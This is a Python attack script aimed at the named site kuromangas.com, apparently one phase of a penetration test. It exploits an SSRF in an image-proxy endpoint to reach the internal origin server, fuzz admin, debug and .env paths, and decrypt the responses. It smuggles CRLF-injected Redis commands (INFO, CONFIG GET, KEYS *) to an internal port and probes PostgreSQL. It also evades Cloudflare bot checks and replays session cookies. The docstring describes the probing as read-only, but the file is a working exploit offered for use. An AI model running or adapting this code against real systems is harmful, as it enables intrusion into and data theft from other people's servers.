#!/usr/bin/env python3
"""Phase 6 PIVOT HUNTING driver for kuromangas.com.

Continuation of F6 webapp. Uses the confirmed SSRF (F-013) in
GET /api/proxy/image?url= to pivot to the internal origin (127.0.0.1:5000)
and internal services (Redis :6379, PostgreSQL :5432).

Key insight (validated): the origin derives the xk2() encryption key from the
HTTP `Host` header. SSRF to http://127.0.0.1:5000/... makes the origin use
hostname "127.0.0.1", so responses can be decrypted with
`decryptor.py --hostname 127.0.0.1 --raw`.

Vectors:
  P1  origin path fuzzing via SSRF (hunt unauthenticated origin-only routes)
  P2  Redis RCE via SSRF + CRLF injection (read-only: INFO/PING/KEYS/CONFIG GET)
  P3  PostgreSQL via SSRF (documented limitation)
  P6  misc: header bypass tricks, crypto-version probe, redirect-chain, x-kuro-datakey

NON-DESTRUCTIVE (§3, §17): no FLUSHALL/SET/CONFIG SET persistente, no admin
destructive endpoints, no DELETE. Read-only probing only. If Redis without
AUTH is confirmed -> document CRITICAL and STOP that sub-vector.

Secrets (session, _kn) loaded from /tmp/kuromangas_session.json (chmod 600),
NEVER written to repo.
"""
import asyncio, json, os, sys, time, subprocess, urllib.parse, random, string
from playwright.async_api import async_playwright

BASE = "https://kuromangas.com"
ORIGIN = "127.0.0.1"
ORIGIN_PORT = 5000
ORIGIN_BASE = f"http://{ORIGIN}:{ORIGIN_PORT}"
HOSTNAME = "kuromangas.com"          # for edge (normal API) decryption
ORIGIN_HOSTNAME = ORIGIN             # for SSRF'd origin response decryption
REPO = "/home/ubuntu/kuromangas.com"
WEBAPP = REPO + "/webapp"
CAPS = WEBAPP + "/caps"
DEC = WEBAPP + "/decrypted"
ENUM = REPO + "/enum"
DECRYPTOR = ENUM + "/decryptor.py"
PIVOT_CAPS = WEBAPP + "/caps/pivot"
os.makedirs(PIVOT_CAPS, exist_ok=True)

SESSION_FILE = "/tmp/kuromangas_session.json"

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

def log(*a): print("[*]", *a, flush=True)
def warn(*a): print("[!]", *a, file=sys.stderr, flush=True)

def save_cap(name, cap):
    p = os.path.join(PIVOT_CAPS, name)
    with open(p, "w") as f: json.dump(cap, f, indent=2, ensure_ascii=False)
    return p

async def _launch(p, headless=True):
    b = await p.chromium.launch(
        headless=headless,
        args=["--no-sandbox","--disable-blink-features=AutomationControlled",
              "--disable-dev-shm-usage"])
    ctx = await b.new_context(user_agent=UA, viewport={"width":1366,"height":900},
                              locale="pt-BR", java_script_enabled=True)
    return b, ctx

async def clear_cf(page):
    for attempt in range(15):
        try:
            await page.goto(BASE+"/api/health", wait_until="domcontentloaded", timeout=30000)
            await page.wait_for_timeout(2500)
            txt = await page.content()
            if "Just a moment" in txt or "cf-chl" in txt.lower():
                await page.wait_for_timeout(6000); continue
            return True
        except Exception as e:
            await page.wait_for_timeout(3000)
    return False

async def load_session(ctx):
    if not os.path.exists(SESSION_FILE) or os.path.getsize(SESSION_FILE)==0:
        return None
    sess = json.load(open(SESSION_FILE))
    await ctx.add_cookies(sess.get("cookies", []))
    return sess

def decrypt_origin_response(body, hostname=ORIGIN_HOSTNAME, datakey=None, date=None):
    """Decrypt a _v_secure body using decryptor.py with the given hostname.
    Returns (plain_text, err)."""
    if not isinstance(body, str) or "_v_secure" not in body:
        return body, None
    b64 = body
    try:
        obj = json.loads(body)
        if isinstance(obj, dict) and "_v_secure" in obj:
            b64 = obj["_v_secure"]
    except Exception: pass
    if date is None:
        date = time.strftime("%Y-%m-%d", time.gmtime())
    args = [sys.executable, DECRYPTOR, "--b64", b64, "--date", date,
            "--hostname", hostname]
    if datakey:
        args += ["--datakey", datakey]
    else:
        args += ["--raw"]
    try:
        out = subprocess.run(args, capture_output=True, text=True, timeout=30)
        if out.returncode != 0:
            return None, out.stderr.strip()
        return out.stdout.strip(), None
    except Exception as e:
        return None, str(e)

async def ssrf_fetch(page, target_url, extra_hdrs=None, nonce=None, method="GET", payload=None):
    """Call /api/proxy/image?url=<target_url> via the browser (auth required).
    Returns dict {status, body, ct, target, err}."""
    ep = "proxy/image?url=" + target_url
    url = BASE + "/api/" + ep
    js = """
    async ([u,m,p,h])=>{
      const hdrs={'x-crypto-version':'v4.8'};
      if(h) for(const k in h) hdrs[k]=h[k];
      const opt={method:m,credentials:'include',headers:hdrs};
      if(p){ hdrs['content-type']='application/json'; opt.body=JSON.stringify(p); }
      try{
        const r=await fetch(u,opt);
        let body=''; try{body=await r.text()}catch(e){body='<err>'}
        const H={}; r.headers.forEach((v,k)=>H[k]=v);
        return {status:r.status, dk:H['x-kuro-datakey'], cv:H['x-crypto-version'],
                ct:H['content-type'], body};
      }catch(e){ return {err:String(e)} }
    }
    """
    hdrs = dict(extra_hdrs or {})
    if nonce: hdrs["X-Session-Nonce"] = nonce
    r = await page.evaluate(js, [url, method, payload, hdrs])
    r["target"] = target_url
    r["ep"] = ep
    r["date"] = time.strftime("%Y-%m-%d", time.gmtime())
    return r

# ---------------------------------------------------------------------------
# P-1: Origin path fuzzing via SSRF
# ---------------------------------------------------------------------------
# Candidate origin-only paths / debug paths / common framework endpoints.
P1_PATHS = [
    # health/debug/metrics
    "/api/health", "/api/healthz", "/api/ready", "/api/status", "/api/version",
    "/api/config", "/api/env", "/api/debug", "/api/debug/health", "/api/debug/status",
    "/api/internal", "/api/internal/health", "/api/private", "/api/dev",
    "/api/dev/health", "/api/dev/tokens", "/api/dev/flags", "/api/dev/reset",
    "/api/dev/maintenance", "/api/admin/health", "/api/metrics", "/metrics",
    "/healthz", "/readyz", "/api/v1/health", "/api/v4/health",
    "/swagger", "/swagger.json", "/api/openapi.json", "/api/openapi",
    "/api/docs", "/api/swagger", "/api/swagger-ui", "/docs",
    "/graphql", "/api/graphql", "/api/graphiql",
    "/__next/data", "/actuator", "/actuator/health", "/actuator/env",
    "/api/auth/me", "/api/auth/session", "/api/me",
    # common dev/internals
    "/api/_debug", "/api/_health", "/api/_status", "/api/_metrics",
    "/api/internal/users", "/api/internal/config", "/api/internal/env",
    "/api/system", "/api/system/health", "/api/system/info",
    "/api/info", "/api/whoami", "/api/ping", "/api/pong",
    "/api/test", "/api/test/connection", "/api/test/db",
    "/api/db", "/api/db/health", "/api/redis", "/api/redis/health",
    "/api/admin/debug", "/api/admin/env", "/api/admin/config", "/api/admin/system",
    "/api/admin/metrics", "/api/admin/info", "/api/admin/redis",
    # Next.js / framework internals
    "/_next", "/_next/data/buildid/index.json", "/api/_next",
    "/api/ssr", "/api/hydration",
    # well-known internal
    "/.env", "/env", "/config", "/config.json", "/api/config.json",
]

# Endpoints from the bundle (237) that might behave differently at origin.
# We probe a representative set of read-only GET endpoints, focusing on
# admin/staff (to check if origin bypasses RBAC) + dev/internal.
P1_BUNDLE_EPS = [
    # public-ish (likely 200 at origin too — sanity)
    "health", "caps/h", "caps/semana", "mangas/genres", "mangas/people",
    "events/active",
    # user-scoped (origin may or may not enforce auth — these need session though)
    "users/me/profile", "users/me/settings", "users/me/library",
    "users/me/coins/balance", "notifications/count", "anilist/status",
    "scans/me/my-scans", "user/channel", "payments/list", "payments/supporter-status",
    # admin GET read-only (origin may skip RBAC?)
    "admin/verify-access", "admin/users", "admin/settings",
    "admin/admin-logs", "admin/bot-tokens", "admin/mangas", "admin/chapters",
    "admin/chapters/reported", "admin/comments", "admin/comments/reported",
    "admin/deletion-requests", "admin/deletion-requests/count",
    "admin/events", "admin/gamification/metrics", "admin/gamification/settings",
    "admin/grants", "admin/profanity", "admin/reading-history/all",
    "admin/supporters", "admin/supporters/gif-failures", "admin/titles",
    "admin/users/reported", "admin/anilist/stats", "admin/anilist/list",
    "admin/badges", "admin/reading-history/all",
    # staff GET read-only
    "staff/borders", "staff/borders/multi", "staff/comments/reported",
    "staff/scan-manga-requests", "staff/upload-ranking", "staff/users",
    "staff/users/reported",
    # dev endpoints
    "dev", "dev/tokens", "dev/flags", "dev/reset", "dev/maintenance",
]

async def cmd_p1(page, ctx, sess):
    """P-1: fuzz origin paths via SSRF; compare 200 vs 401/403/404."""
    nonce = sess.get("_kn") if sess else None
    log("== P-1: origin path fuzzing via SSRF (target=%s) ==" % ORIGIN_BASE)
    results = []
    # Phase 1: candidate paths (debug/internal/framework)
    seen = set()
    paths = list(P1_PATHS)
    # de-dup bundle eps as /api/<ep>
    for ep in P1_BUNDLE_EPS:
        p = "/api/" + ep
        if p not in seen:
            paths.append(p); seen.add(p)
    log("  %d candidate paths" % len(paths))
    hits = []
    for i, path in enumerate(paths):
        target = ORIGIN_BASE + path
        r = await ssrf_fetch(page, target, nonce=nonce)
        fn = "p1_%03d_%s.json" % (i, path.replace("/","_").replace(" ",""))
        save_cap(fn, r)
        status = r.get("status")
        body = r.get("body") or ""
        is_sec = "_v_secure" in body
        err = r.get("err")
        # origin status inference: if proxy returned 200 with _v_secure -> origin 200
        # if 500 "Request failed with status code N" -> origin N
        origin_status = None
        if status == 200 and is_sec:
            origin_status = 200
        elif status == 500 and "Request failed with status code" in body:
            try:
                origin_status = int(body.split("status code")[1].strip().rstrip("}").strip().strip('"'))
            except Exception:
                origin_status = None
        elif status == 500 and "details" in body:
            ds = body
            origin_status = "ERR:" + ds[:60]
        elif err:
            origin_status = "NETERR"
        rec = {"path":path,"proxy_status":status,"origin_status":origin_status,
               "sec":is_sec,"body_preview":body[:100]}
        results.append(rec)
        flag = ""
        if origin_status == 200:
            flag = " <<< 200 ORIGIN (decodable)"
            hits.append((path, r))
        log("  [%s/%s] %-40s origin=%s%s" % (
            str(status), str(origin_status), path[:40], origin_status, flag))
        await page.wait_for_timeout(500)
    # decrypt the hits
    log("  %d origin-200 hits to decrypt" % len(hits))
    for path, r in hits:
        plain, e = decrypt_origin_response(r.get("body",""))
        rec_dec = {"path":path, "decrypted":plain, "err":e}
        save_cap("p1_decrypted_%s.json" % path.replace("/","_"), rec_dec)
        log("  DECRYPT %s: %s" % (path, (plain or "")[:160].replace("\n"," ")))
    with open(os.path.join(PIVOT_CAPS,"_p1_summary.json"),"w") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    log("P-1 done. hits=%d" % len(hits))
    return results

# ---------------------------------------------------------------------------
# P-2: Redis via SSRF + CRLF injection (READ-ONLY)
# ---------------------------------------------------------------------------
REDIS = "127.0.0.1:6379"

async def cmd_p2(page, ctx, sess):
    """P-2: probe Redis :6379 via SSRF. Node fetch is HTTP-only; try CRLF
    injection in the URL path to smuggle RESP commands. READ-ONLY only:
    PING, INFO, CONFIG GET, KEYS *. If Redis responds without AUTH -> CRITICAL.
    """
    nonce = sess.get("_kn") if sess else None
    log("== P-2: Redis :6379 via SSRF + CRLF (READ-ONLY) ==")
    results = []
    # Baseline: plain HTTP GET to Redis (expect socket hang up / non-HTTP)
    base_target = "http://%s/" % REDIS
    r = await ssrf_fetch(page, base_target, nonce=nonce)
    save_cap("p2_redis_baseline.json", r)
    log("  baseline GET redis -> status=%s body=%s" % (r.get("status"), (r.get("body") or "")[:120]))
    results.append({"test":"baseline_plain_http","status":r.get("status"),"body":(r.get("body") or "")[:200],"err":r.get("err")})

    # CRLF injection attempts. Node fetch URL parser may reject raw \r\n but
    # might accept URL-encoded %0d%0a in the path. The server then writes the
    # raw HTTP request line containing the decoded CRLF -> Redis RESP.
    # RESP commands are CRLF-terminated: *N\r\n$len\r\ncmd\r\n...
    # We craft a path that, after the GET /.... HTTP/1.1 line, embeds RESP.
    # Modern Node (undici) rejects CRLF in URL since ~2022 (CVE-2023-...),
    # but many runtimes still pass them through. Test both %0d%0a and literal.
    resp_ping = "PING"
    resp_info = "INFO"
    resp_config_get = "CONFIG%20GET%20*"
    resp_keys = "KEYS%20*"

    # We try several encodings of the CRLF + RESP command.
    # The trick: HTTP request = "GET /<payload> HTTP/1.1\r\nHost: ...\r\n\r\n"
    # If <payload> contains \r\n, the parser may split into a new line that
    # Redis interprets as RESP (since Redis reads line-by-line).
    # For RESP we need: *1\r\n$4\r\nPING\r\n  etc.
    crlf_tests = [
        ("ping_simple", "http://%s:6379/" % REDIS + "x%0d%0aPING%0d%0a"),
        ("info_simple", "http://%s:6379/" % REDIS + "x%0d%0aINFO%0d%0a"),
        ("config_get", "http://%s:6379/" % REDIS + "x%0d%0aCONFIG%20GET%20*%0d%0a"),
        ("keys_star", "http://%s:6379/" % REDIS + "x%0d%0aKEYS%20*%0d%0a"),
        ("ping_resp_array", "http://%s:6379/" % REDIS + "x%0d%0a*1%0d%0a$4%0d%0aPING%0d%0a"),
        ("info_resp_array", "http://%s:6379/" % REDIS + "x%0d%0a*1%0d%0a$4%0d%0aINFO%0d%0a"),
        ("config_get_resp", "http://%s:6379/" % REDIS + "x%0d%0a*3%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aGET%0d%0a$1%0d%0a*%0d%0a"),
        # try with %0a only (LF)
        ("ping_lf", "http://%s:6379/" % REDIS + "x%0aPING%0a"),
        # try injecting into a query that the server's fetch may not encode
        ("ping_via_host_crlf", "http://" + REDIS + ":6379/x?y=1%0d%0aPING%0d%0a"),
    ]
    for name, tgt in crlf_tests:
        r = await ssrf_fetch(page, tgt, nonce=nonce)
        save_cap("p2_redis_%s.json" % name, r)
        body = (r.get("body") or "")[:200]
        log("  %s -> status=%s body=%s" % (name, r.get("status"), body.replace("\n"," ")))
        results.append({"test":name,"target":tgt,"status":r.get("status"),
                        "body":body,"err":r.get("err")})
        await page.wait_for_timeout(500)

    with open(os.path.join(PIVOT_CAPS,"_p2_summary.json"),"w") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    log("P-2 done.")
    return results

# ---------------------------------------------------------------------------
# P-6: misc quick vectors
# ---------------------------------------------------------------------------
async def cmd_p6(page, ctx, sess):
    """P-6: header bypass tricks at the origin, crypto-version probe,
    x-kuro-datakey manipulation, redirect-chain SSRF, DNS-rebinding hint."""
    nonce = sess.get("_kn") if sess else None
    log("== P-6: misc quick vectors ==")
    results = []

    # 1) Origin admin endpoint via SSRF with spoofing headers injected into
    #    the *origin request*. NOTE: the proxy/image server's fetch() controls
    #    the headers sent to the origin; we CANNOT inject arbitrary headers
    #    into the server-side fetch from the client. Document this limit.
    #    The only header we control is the URL itself. So header-based auth
    #    bypass at the origin is NOT feasible via this SSRF (we can't add
    #    X-Forwarded-For etc. to the origin request). Document.
    log("  [header-bypass] N/A: client cannot inject headers into the "
        "server-side fetch to the origin (only the URL is user-controlled). "
        "X-Forwarded-For/X-Real-IP/X-Original-URL tricks require header control "
        "we don't have here. Documented limitation.")
    results.append({"vector":"origin_header_bypass","result":"N/A",
                    "reason":"SSRF only controls URL, not headers sent to origin by server fetch()"})

    # 2) crypto-version probe: send x-crypto-version v4.7 / v5.0 to a normal
    #    endpoint and observe behavior (info disclosure of old version?).
    for ver in ["v4.7","v4.9","v5.0","v4.0","v3.0",""]:
        js = """
        async ([u,ver])=>{
          const hdrs={'x-crypto-version':ver};
          try{
            const r=await fetch(u,{method:'GET',credentials:'include',headers:hdrs});
            let body=''; try{body=await r.text()}catch(e){}
            const H={}; r.headers.forEach((v,k)=>H[k]=v);
            return {status:r.status, dk:H['x-kuro-datakey'], cv:H['x-crypto-version'], body:body.slice(0,200)};
          }catch(e){ return {err:String(e)} }
        }
        """
        r = await page.evaluate(js, [BASE+"/api/health", ver if ver else "x"])
        rec = {"vector":"crypto_version","ver":ver,"resp":r}
        results.append(rec)
        log("  crypto-ver '%s' -> status=%s dk=%s body=%s" % (
            ver, r.get("status"), r.get("dk"), (r.get("body") or "")[:80].replace("\n"," ")))
        await page.wait_for_timeout(500)

    # 3) x-kuro-datakey manipulation: send a custom datakey header in a
    #    request and see if the server echoes/confuses it.
    for dk in ["_test123","_admin","custom",""]:
        js = """
        async ([u,dk])=>{
          const hdrs={'x-crypto-version':'v4.8'};
          if(dk) hdrs['x-kuro-datakey']=dk;
          try{
            const r=await fetch(u,{method:'GET',credentials:'include',headers:hdrs});
            const H={}; r.headers.forEach((v,k)=>H[k]=v);
            let body=''; try{body=await r.text()}catch(e){}
            return {status:r.status, resp_dk:H['x-kuro-datakey'], body:body.slice(0,120)};
          }catch(e){ return {err:String(e)} }
        }
        """
        r = await page.evaluate(js, [BASE+"/api/users/me/profile", dk if dk else "x"])
        rec = {"vector":"x-kuro-datakey","sent_dk":dk,"resp":r}
        results.append(rec)
        log("  datakey send '%s' -> status=%s resp_dk=%s" % (
            dk, r.get("status"), r.get("resp_dk")))
        await page.wait_for_timeout(500)

    # 4) Redirect-chain SSRF: stand up a local HTTP server that 302-redirects
    #    to the origin. If the proxy follows redirects, and an allowlist were
    #    added later, this would bypass it. Test that the proxy DOES follow
    #    redirects (sanity) by pointing to our own server -> origin health.
    log("  [redirect-chain] starting local redirect server on :8088...")
    redirect_results = await _test_redirect_chain(page, nonce)
    results.extend(redirect_results)

    # 5) DNS-rebinding hint: we can't easily register a rebind domain here.
    #    Document as a theoretical vector if host validation is added later.
    results.append({"vector":"dns_rebinding","result":"not tested",
                    "reason":"requires attacker-controlled DNS; document if host allowlist added"})
    log("  [dns-rebinding] skipped (needs rebind domain); documented.")

    with open(os.path.join(PIVOT_CAPS,"_p6_summary.json"),"w") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    log("P-6 done.")
    return results

async def _test_redirect_chain(page, nonce):
    """Start a local HTTP server that 302-redirects to the origin health,
    then point the SSRF at our server. Confirms the proxy follows redirects
    (useful if an allowlist is ever added: external-host -> 302 -> internal)."""
    results = []
    import http.server, socketserver, threading
    REDIR_PORT = 8088
    ORIGIN_HEALTH = ORIGIN_BASE + "/api/health"
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            self.send_response(302)
            self.send_header("Location", ORIGIN_HEALTH)
            self.end_headers()
    try:
        srv = socketserver.TCPServer(("127.0.0.1", REDIR_PORT), H)
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        await asyncio.sleep(0.5)
        # The SSRF server can only reach 127.0.0.1 of ITSELF, not our box.
        # Our local server is on the OPERATOR's 127.0.0.1, not the target's.
        # So this won't work unless the target can reach our public IP.
        # Document this limitation. The proxy/image server-side fetch runs
        # on the TARGET host -> it can only reach target's 127.0.0.1, not ours.
        log("  [redirect-chain] N/A: our local redirect server is on the "
            "OPERATOR host, unreachable by the target's server-side fetch. "
            "To test redirect bypass we'd need a public attacker server. "
            "Documented limitation. (proxy/image still SSRFs arbitrary "
            "http/https — no allowlist present, so redirect bypass not needed.)")
        results.append({"vector":"redirect_chain","result":"N/A",
                        "reason":"operator-local server unreachable by target; "
                                 "no allowlist present on proxy/image (SSRF arbitrary), "
                                 "so redirect bypass unnecessary"})
        srv.shutdown()
    except Exception as e:
        log("  [redirect-chain] err: %s" % e)
        results.append({"vector":"redirect_chain","result":"err","err":str(e)})
    return results

# ---------------------------------------------------------------------------
# P-3: PostgreSQL via SSRF (documented limitation)
# ---------------------------------------------------------------------------
async def cmd_p3(page, ctx, sess):
    nonce = sess.get("_kn") if sess else None
    log("== P-3: PostgreSQL :5432 via SSRF (documented) ==")
    # PG speaks a binary startup protocol; an HTTP request yields ECONNRESET.
    # No viable CRLF->binary smuggling. Document and move on.
    r = await ssrf_fetch(page, "http://127.0.0.1:5432/", nonce=nonce)
    save_cap("p3_pg_baseline.json", r)
    log("  PG :5432 -> status=%s body=%s" % (r.get("status"), (r.get("body") or "")[:120]))
    rec = {"vector":"postgres_ssrf","result":"not viable",
           "reason":"PG startup is binary; HTTP fetch -> ECONNRESET; no CRLF->binary "
                     "smuggling path via Node fetch",
           "baseline":r.get("body")}
    with open(os.path.join(PIVOT_CAPS,"_p3_summary.json"),"w") as f:
        json.dump(rec, f, indent=2, ensure_ascii=False)
    log("P-3 done (not viable).")
    return rec

# ---------------------------------------------------------------------------
async def cmd_all():
    async with async_playwright() as p:
        b, ctx = await _launch(p, headless=True)
        pg = await ctx.new_page()
        ok = await clear_cf(pg)
        if not ok:
            warn("CF not cleared — abort"); await b.close(); return
        sess = await load_session(ctx)
        if not sess:
            warn("no session — run webapp_attack.py register first"); await b.close(); return
        log("session loaded: _kn=%s" % (sess.get("_kn") or "<none>"))
        # sanity: auth/me still works?
        await cmd_p1(pg, ctx, sess)
        await cmd_p2(pg, ctx, sess)
        await cmd_p3(pg, ctx, sess)
        await cmd_p6(pg, ctx, sess)
        await b.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__); sys.exit(1)
    cmd = sys.argv[1]
    if cmd == "all":
        asyncio.run(cmd_all())
    elif cmd == "p1":
        async def r():
            async with async_playwright() as p:
                b,ctx=await _launch(p); pg=await ctx.new_page()
                await clear_cf(pg); sess=await load_session(ctx)
                await cmd_p1(pg,ctx,sess); await b.close()
        asyncio.run(r())
    elif cmd == "p2":
        async def r():
            async with async_playwright() as p:
                b,ctx=await _launch(p); pg=await ctx.new_page()
                await clear_cf(pg); sess=await load_session(ctx)
                await cmd_p2(pg,ctx,sess); await b.close()
        asyncio.run(r())
    elif cmd == "p3":
        async def r():
            async with async_playwright() as p:
                b,ctx=await _launch(p); pg=await ctx.new_page()
                await clear_cf(pg); sess=await load_session(ctx)
                await cmd_p3(pg,ctx,sess); await b.close()
        asyncio.run(r())
    elif cmd == "p6":
        async def r():
            async with async_playwright() as p:
                b,ctx=await _launch(p); pg=await ctx.new_page()
                await clear_cf(pg); sess=await load_session(ctx)
                await cmd_p6(pg,ctx,sess); await b.close()
        asyncio.run(r())
    else:
        print("unknown command:", cmd); print(__doc__); sys.exit(1)
